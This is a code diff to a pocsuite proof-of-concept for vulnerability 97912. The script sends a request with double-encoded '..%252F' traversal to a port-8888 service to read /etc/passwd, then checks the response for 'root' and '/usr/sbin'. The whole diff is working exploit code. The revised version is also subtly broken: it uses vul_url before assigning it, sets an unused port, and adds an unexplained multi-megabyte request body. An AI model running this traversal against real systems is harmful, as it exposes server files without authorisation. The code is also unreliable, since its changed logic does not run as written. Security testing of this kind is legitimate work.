@@ -4,6 +4,9 @@ from pocsuite.api.poc import register
 from pocsuite.api.poc import Output, POCBase
 from pocsuite.api.request import req
 import urllib
+import socket
+import time
+from urlparse import urljoin
 
 class TestPOC(POCBase):
     vulID = '97912'  # ssvid
@@ -34,12 +37,12 @@ class TestPOC(POCBase):
         host,port = urllib.splitport(host)
         result = {}
         if port is None:
-            vul_url = self.url+":8888"
-        target = vul_url+"/foo/default/master/..%252F..%252F..%252F..%252Fetc%252fpasswd"
-        response_code = req.get(target).status_code
-        r = req.get(target)
-        print(r.text)
-        if response_code == 200 and "bin" in r.text and "/usr/sbin" in r.text and "root" in r.text:
+            port = 8888
+        http_body = "010202030302"*500000
+        vul_url = urljoin(vul_url,"/foo/default/master/..%252F..%252F..%252F..%252Fetc%252fpasswd")
+        chunk = req.get(vul_url,data=http_body).text
+        print(chunk)
+        if  "bin" in chunk and "/usr/sbin" in chunk and "root" in chunk:
             result['VerifyInfo'] = "success"
         pass
         return self.parse_output(result)
